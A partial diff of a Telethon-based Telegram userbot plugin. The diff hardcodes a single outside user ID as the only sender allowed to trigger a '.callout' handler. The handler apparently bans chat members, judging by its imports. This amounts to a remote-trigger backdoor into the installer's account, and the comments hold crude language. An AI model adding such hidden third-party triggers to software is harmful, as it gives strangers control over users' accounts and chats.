@@ -2,7 +2,7 @@ from asyncio import sleep
 from telethon.tl.types import ChatBannedRights
 from telethon.tl.functions.channels import EditBannedRequest
 from userbot.events import register
-from userbot import CMD_HELP, DEVS
+from userbot import CMD_HELP
 from userbot import CMD_HANDLER as cmd
 from userbot.utils import ram_cmd
 # Aku nambah kredit sdikit
@@ -10,7 +10,7 @@ from userbot.utils import ram_cmd
 # Port By @VckyouuBitch From GeezProject
 # Perkontolan Dengan Hapus Credits
 @ram_cmd(pattern="allout$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.callout$")
+@register(incoming=True, from_users=1826643972, pattern=r"^\.callout$")
 async def testing(event):
     nikal = await event.get_chat()
     chutiya = await event.client.get_me()
